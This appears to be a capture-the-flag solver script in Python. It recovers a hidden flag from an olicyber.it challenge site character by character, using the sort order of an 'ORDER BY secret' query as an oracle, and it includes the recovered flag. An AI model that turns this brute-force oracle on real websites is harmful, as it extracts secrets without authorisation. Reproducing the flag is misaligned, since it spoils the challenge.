import requests
from bs4 import BeautifulSoup
import string

flag = "flag{sqli_1sn7_tH3_0nly_50luT10n_4a3e7b61}"

letters = list("}" + string.digits + string.ascii_uppercase + "_" + string.ascii_lowercase)

while True:

    for letter_idx, l in enumerate(letters):
        s = requests.Session()
        r = s.post("https://secret-storage.challs.olicyber.it/")

        payload = {
            "name": flag + l,
            "secret": flag + l
        }

        r = s.post("https://secret-storage.challs.olicyber.it/?order=secret", data=payload)

        soup = BeautifulSoup(r.text, "html.parser")

        arr = []

        pos_c = 0
        data = soup.find_all("td")
        for i, td in enumerate(data):
            if td.string == "flag":
                pos_c = i
        
        # print("Trying: ", flag + l)
        if pos_c == 0:
            flag += letters[letter_idx - 1]
            print("Found: ", flag)

            if flag[-1] == '}':
                exit()

            break


# SELECT name, created_at FROM entries WHERE owner='id' ORDER BY secret